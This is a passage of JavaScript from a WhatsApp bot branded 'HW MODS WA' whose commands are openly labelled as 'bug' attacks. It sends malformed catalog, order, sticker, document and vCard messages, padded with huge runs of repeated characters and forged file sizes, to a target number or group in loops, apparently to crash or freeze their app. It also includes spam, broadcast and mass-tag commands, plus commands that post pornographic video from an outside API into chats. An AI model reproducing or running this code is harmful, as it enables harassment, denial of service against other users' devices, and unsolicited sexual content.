𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦`,
"description": `© HW MODS WA`,
"currencyCode": "IDR",
"footerText": `© HW MODS WA`,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `© HW MODS WA WE ARE NOT MASTOD`,
"url": "wa.me/6285714170944"
},
"businessOwnerJid": "6285714170944@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
break

//=================================================//
case 'catalogpc': case 'cataloggc':  {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (args.length < 1) return anjay(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"title": `© HW MODS WA${ngazap(prefix)}`,
"description": `© HW MODS WA`,
"currencyCode": "IDR",
"footerText": `© HW MODS WA`,
"productImageCount": 1,
"firstImageId": 1,
"retailerId": `© HW MODS WA WE ARE NOT MASTOD`,
"url": "wa.me/6285714170944"
},
"businessOwnerJid": "6285714170944@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: doc})
haikal.relayMessage(num, catalog.message, { messageId: catalog.key.id })
}
deploy(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
}
break
//=================================================//
/*BUG WACAP */
case 'ampas1' : {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
a = await haikal.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
haikal.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
}
break
//=================================================//
/*BUG WACAP */
case 'ampas2' : {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!isCreator) return
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@g.us"
a = await haikal.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
haikal.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(10000)
}
break
//=================================================//
case 'gaskal': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!isCreator) return
let user = global.db.data.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
deploy(`${m.pushName} Hello Saya Bot Hw Mods${text ? ': ' + text : ''}`)
}
break
//=================================================//
case 'bugstik':{
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
if (args.length == 0) return anjay(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, {sticker: thumb},{quoted: {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "999999999999",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}
}
}})
}
deploy(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
//=================================================//
case 'bugie':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (args.length == 0) return anjay(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, {document: thumb},{quoted: {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `HW MODS WA${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=",
}
}
}})
}
deploy(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
//=================================================//
//=================================================//
case 'bugbctext': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!text) throw `*Type some text*\n\nExample : ${prefix + command} hwmods`
let doc = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `© ${botname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${haikal.user.name},;;;\nFN:${botname},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': await getBuffer(picak+'Brodcast'), thumbnail: await getBuffer(picak+'Brodcast'),sendEphemeral: true}}}
let anu = await store.chats.all().map(v => v.id)
anjay(`*Send Broadcast To* ${anu.length} Chat\n*Time ${anu.length * 1.5} seconds*`)
for (let yoi of anu) {
await sleep(1500)
haikal.sendMessage(yoi, {text:`${text}`}, {quoted:doc})
}
anjay('*Success Broadcast*')
}
break
//=================================================//

//=================================================//
case 'bugtag': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!m.isGroup) throw groupon(from)
haikal.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: doc })
}
break
case 'hiya':{
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!isCreator) return
anuin = fs.readFileSync('./baseikal/sound/ngeselin.BIN')
haikal.sendMessage(m.chat, { document: anuin, mimetype: 'application/octet-stream', fileName: `HW MODS WA ${ngazap(prefix)}.BIN`, title: `HW MODS WA ${ngazap(prefix)}.BIN` }, { quoted: doc })
}
break
//=================================================//
case 'bugtod': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
 const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© HW MODS WA${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:HW MODS WA\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}
haikal.sendContact(m.chat, global.ownerr, fkontaak)
}
break
case 'troli3': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
a = await haikal.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
	var troli2 = generateWAMessageFromContent(m.chat,{
	"orderMessage": {
	"orderId": "599519108102353",
	"thumbnail": virgam,
	"itemCount": 1999,
	"status": "INQUIRY",
	"surface": "CATALOG",
	"message": " BY HW MODS WA ",
	"orderTitle": " BUG TROLI ", // 
	"sellerJid": "6281214281312@s.whatsapp.net",
	"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
	}
	},
	{quoted: {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
	}, contextInfo:{}}) 
	haikal.relayMessage(m.chat, troli2.message, { messageId: troli2.key.id, a})
	}
	}
	break
case 'bugbokep':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
dwhe = await getBuffer(`https://raku-web.herokuapp.com/api/bokep?apikey=RakuKeyTod`)
haikal.sendMessage(m.chat, { video: dwhe, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `Nih Bokep Nya` }, { quoted: doc })
}
break
case 'bugbokep2':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
dwhee = await getBuffer(`https://raku-web.herokuapp.com/api/bokep?apikey=RakuKeyTod`)
haikal.sendMessage(m.chat, { video: dwhee, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `[⫹⫺ - 㑒 ❝𝗛𝗪 - 𝗠𝗢𝗗𝗦❞ - ★ 𝗪𝗔 ★ ϟ〽️]\ 🦇̣̣̣̣̣̣̣̣⃟   ...𝛀..𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦